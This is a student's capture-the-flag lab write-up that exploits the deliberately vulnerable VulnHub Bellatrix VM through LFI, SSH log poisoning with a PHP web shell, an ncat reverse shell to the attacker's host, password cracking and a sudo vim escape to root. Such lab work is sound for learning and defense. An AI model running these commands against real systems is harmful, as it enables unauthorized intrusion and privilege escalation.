Lorenzo Martin Diaz Avalos - IN2000252

# Cybersecurity Lab

This repository shows the steps performed during the simulation of an attack on virtual machines.

## Introduction

### Description
Bellatrix is ​​a virtual machine available on [VulnHub](https://www.vulnhub.com/entry/hogwarts-bellatrix,609/), designed to simulate a vulnerable environment, ideal for performing hacking techniques. The **goal** is to gain *root* access and Catch the Flag by exploiting vulnerabilities in the system.

### Prerequisites
The following tools and software are needed to simulate the attack:
- VirtualBox: software to run virtual machines
  - Kali Linux: virtual machine used as attacker
  - Bellatrix Machine: virtual machine used as target
- Pentesting tools: netdiscover, nmap, Metasploit
- Cracking tools: John the Ripper


### Threat Model
It is assumed that the attacker:
- is within the same network as the target machine
- can communicate with servers on port 80 and 22

## Environment Configuration
Both machines are set up behind a NAT network with IPv4 prefix **10.0.2.0/24** and receive a dynamic IPv4 address assigned by DHCP. With this configuration VMs can directly communicate between themselves.  
The MAC addresses of the two machines are also set:
- Kali &rarr; 08:00:27:e2:2f:b1
- Bellatrix &rarr; 08:00:27:6a:bf:a9

## Steps
The following steps will be followed for the activity:
1. Getting the IP addresses of machines
2. Getting open port details by using the *nmap* tool
3. Exploring HTTP Service
4. Exploiting LFI vulnerability through SSH Log Poisoning
5. Taking the Reverse Shell
6. Escalating user privileges and reading the *root* flag

## Start Activity


### 1. Network Scan
The first step is to identify the IP of the Kali machine we are working on and of the Bellatrix Machine:

- IP Kali Machine &rarr; We run the `ifconfig` command which shows the IP address and various details about it and find that the Kali Machine is located at the address 10.0.2.15
- IP Bellatrix Machine &rarr; We execute the command `netdiscover -r 10.0.2.0/24`, that is a tool that can scan and monitor network traffic using ARP requests, and find that the Bellatrix machine is located at the address 10.0.2.14, in fact the MAC address coincides with the one set in the VM


 ![netdiscover_ifconfig](netdiscover_ifconfig.png)


### 2. Enumeration
Next, we have to find which servers are running on the Bellatrix Machine (and can be abused by the Kali Machine), the common jargon of this step is called **enumeration**, so we proceed executing the command `nmap -sC -sV -p- 10.0.2.14`, enabling Nmap's default script scanning with `-sC` option, version detection with `-sV` option and scanning all 65535 TCP ports with `-p-` option.  

> In this case it is not of significant importance but, in general, knowing the software version is essential to determine which exploits the server is vulnerable to!

Output has shown only two open ports for SSH (22) and HTTP (80).  

  
### 3. Exploring HTTP Service
We explore the target IP in the web browser and see an image and a long string that repeats "*ikilledsiriusblack*" many times. The last line ends with **.php** which could be a clue to a path.  

Next, we can check the page source for further clues.  


![page_source](page_source.png)   


From the commented code we notice a clue for a possibility of ***Local File Inclusion Vulnerability***, a vulnerability that allows an attacker to access server files by manipulating paths in HTTP requests.  
> See *Alternate Terms* in [CWE-98](https://cwe.mitre.org/data/definitions/98.html)

So, let's try to perform LFI in the script *ikilledsiriusblack.php* by including the */etc/passwd* file in the URL.  

![etc_passwd](etc_passwd.png)  


As seen above, the *etc/passwd* file contents are displayed on the browser. This confirms the LFI vulnerability!
  
Furthermore, looking each line carefully, got two things:  

`bellatrix:x:1000:1000:Bellatrix,,,:/home/bellatrix:/bin/bash`  
`lestrange:x:1001:1001::/home/lestrange:/bin/rbash`

*bellatrix* user has */bin/bash* that means everything is allowed while *lestrange* user has */bin/rbash* that means it has restricted shell, can’t perform all terminal commands, so, we might have to escape the restricted bash.  
In the next step, we will exploit the LFI Vulnerability to gain further access. 

### 4. Exploiting LFI Vulnerability

As we know, the URL is vulnerable to LFI, so we can access any file from the Bellatrix machine through the vulnerable URL. However, we need to identify ways to access the Bellatrix machine. One way through which this can be achieved is exploiting LFI Vulnerability by conducting an ***SSH log poisoning attack***. Log poisoning is a very common technique that is used to gain a *reverse shell* with the help of the LFI vulnerability. We will inject several malicious logs into the SSH log file and analyze how the server behaves. First, let us verify whether we can access the SSH log file on the Bellatrix machine, trying to include the */var/log/auth.log* file in the URL.


![auth_log](auth_log.png)  


Now that we can access the *auth.log* file, let’s see the working of SSH log poisoning.  

If we try anything related to authentication, the server will log it in *auth.log* file. First, i will try to authenticate as a random user with `ssh randomuser@10.0.2.14` command and then, since the injected file is included by the PHP script, if we inject a PHP code, the webserver will execute that as well, so we try to do that with `ssh '<?php system($_GET['cmd']); ?>'@10.0.2.14` command, where the user part is a PHP code for executing any command we pass in **cmd** parameter:
- `system( )` is a PHP function that allows the execution of shell commands and display the output
- `$_GET['cmd']` code retrieves the value of the query parameter **cmd** from the URL’s    



**Issue**: running the second command, I encounter the following error in the shell of local machine:  
`remote username contains invalid characters`  
This error suggests that the SSH client is rejecting the username due to the presence of special characters, which are part of the PHP code I'm trying to inject. So, SSH Log Poisoning is now patched from upstream `ssh`.  
>   For more details of the patch check the function `valid_ruser()` in this [link](https://github.com/openssh/openssh-portable/commit/7ef3787c84b6b524501211b11a26c742f829af1a).

We need a workaround!

#### 4.1 Metasploit Workaround
One way to run the command `ssh '<?php system($_GET['cmd']); ?>'@10.0.2.14` is using the Metasploit framework, loading a specific Metasploit module to perform SSH scans and login attempts.   


The commands to execute are:
```
msfconsole
use auxiliary/scanner/ssh/ssh_login
set USERNAME <?php system($_GET['cmd']); ?>
set password any_passwd
set rhost 10.0.2.14
run
```
> Note that at this moment we are only interested in ensuring that in the *auth.log* file there are new entries relating to the attempted authentication, to ensure that if we inject some code it will be executed.  


At this point, if we return to the *auth.log* file via the vulnerable PHP page, we see new entries related to attempted SSH authentications. Notably, when injecting the username `<?php system($_GET['cmd']); ?>`, the log file directly saves the malicious PHP code exactly as provided without sanitization at the moment of insertion.

However, when viewing the log file through the PHP script in the browser, sanitization is applied only at rendering time, causing the injected username to visually appear as blank (`Invalid user from...`). This sanitization might initially mislead observers, as the PHP injection is not immediately visible in the web-rendered log.

The presence and successful injection of the PHP code become apparent only after injecting and executing a command. Specifically, if we pass a command (e.g., `cmd=ls -la`) through the URL parameter, the previously hidden PHP code executes the command, clearly showing its output in place of the sanitized username.

Thus, the sanitization performed by the PHP rendering function protects only the visual display of the logs, not the underlying log file itself, which remains vulnerable and exploitable through LFI.


![log_poisoning](log_poisoning.png)  


### 5. Obtaining Reverse Shell

Now, it’s time to take the reverse shell. We want to arrive at the scenario where on the Kali Machine there is a listener (a server) listening on a certain port and on the Bellatrix Machine there is a Reverse Shell connected to Kali Machine.    
I have used Netcat as listener, a command-line utility that reads and writes data across network connections using the TCP or UDP protocols, so in the terminal of Kali Machine we execute `nc -lvp 1234` command, in which:
 - *-l* stands for "listen", tells *nc* to go into listen mode
 - *-v* stands for "verbose", makes *nc* more verbose showing additional connection status messages
 - *-p* specifies the port on which *nc* should listen, 1234 in this case 


After that we have to execute some code on the Bellatrix Machine to open a connection with the Kali Machine on port 1234 and spawn a process that executes */bin/bash*, so we do this by injecting code directly into the log URL. The code we inject is `ncat -e /bin/bash 10.0.2.15 1234`, where:
 - *ncat* is an advanced implementation of *nc* that offers many additional features
 - *-e* followed by */bin/bash* specifies to run the *bin/bash* program as a child process when a connection is established
 - 10.0.2.15 and 1234 are the address and the port to connect to

At this point we are in the scenario in which the Bellatrix Machine has spawned a reverse shell, obtained with *netcat*, connected to our Kali Machine. However, there is a small drawback to this type of shell. That is, the shell is a very plain shell that doesn’t have any prompts or features like bash-completion. Hence, it is required to upgrade to an intelligent reverse shell.   
We can use `python3 -c 'import pty;pty.spawn("/bin/bash")'` command, in which:
- *python3* starts the Python3 interpreter
- *-c* is a parameter that specifies to execute the Python code provided as a string
- *import pty* imports the Python *pty* module
- *pty.spawn("/bin/bash")* uses the *spawn* function of the *pty* module to start a new bash process as a child process


### 6. Privilege Escalation

Once we have an interactive shell we can list the contents of the current directory and notice that, in addition to the *.php* and *.gif* files, there is another directory owned by *root*, so we change directory with the `cd` command and list the contents of the folder.  
We find 2 files owned by *root*, so print their contents with `cat` command. 


![priv_esc](priv_esc.png)  


We can notice that:
- *.secret.dic* is a dictionary-type file that contains a list of words
- *Swordofgryffindor* is a file containing *lestrange* and a value that could be obtained by computing the hash of the password of user *lestrange*

so, with the cracking software **John the Ripper** we can try to perform *Brute Force: [Password Cracking](https://attack.mitre.org/techniques/T1110/002/) (Offline Guessing)*.  
With the **nano** editor we create two local files on the Kali Machine:
- *hash*: copy of *Swordofgryffindor*
- *dict.txt*: copy of .secret.dic

and run the command `john --wordlist=dict.txt hash`, where *--wordlist* specifies the path to the dictionary file.  

![johntheripper](johntheripper.png)

We get the password of user *lestrange*.


> The reason I didn't run *Password Cracking* directly in the shell obtained with *ncat* is because `john` command wasn't installed and *bellatrix* user doesn't have privileges to install it.


Now the scenario is that we have the credentials of user *lestrange*.  
So, in the shell obtained with *netcat*, we execute the command `su lestrange`, used to switch from the current user to the *lestrange* user. To figure out what privileges *lestrange* has on the system, we run the command `sudo -l` that list user's privilege or check a specific command, and find that user *lestrange* has permission to run `vim` command from any host and as any user without password request.

We can exploit these privileges by running the command `sudo vim -c ':!/bin/sh'`, obtaining an interactive shell with *root* privileges, in fact:

- *sudo* allows executing commands with the privileges of another user, *root* by default
- *vim* is a text editor
- *-c* followed by *':!/bin/sh'* specifies a command to run after starting *vim*

and so what happens step by step is:
1. sudo command is run with *root* privileges
2. *vim* starts as a text editor with *root* privileges
3. Immediately after startup, *vim* runs the command `:!/bin/sh`
4. `:!/bin/sh` command opens a shell with *root* privileges
    

Once we arrive in the scenario where we have a shell open with *root* privileges, we move to the */root* directory, list its contents and print the flag.

![flag](flag.png)


We have gained *root* access and read *root* flag. This completes the challenge! 


## Credits
For the execution of the activity the following links were consulted:
- [https://www.hackingarticles.in/hogwarts-bellatrix-vulnhub-walkthrough/](https://www.hackingarticles.in/hogwarts-bellatrix-vulnhub-walkthrough/)
- [https://nepcodex.com/2021/09/hogwarts-bellatrix-vulnhub-walkthrough/](https://nepcodex.com/2021/09/hogwarts-bellatrix-vulnhub-walkthrough/)
- [https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/](https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/)
- [https://www.youtube.com/watch?v=WtsHTz0Zhys&list=FLVQ-IegBSfd6GX_38cD6nlw&index=2](https://www.youtube.com/watch?v=WtsHTz0Zhys&list=FLVQ-IegBSfd6GX_38cD6nlw&index=2)
- [https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)
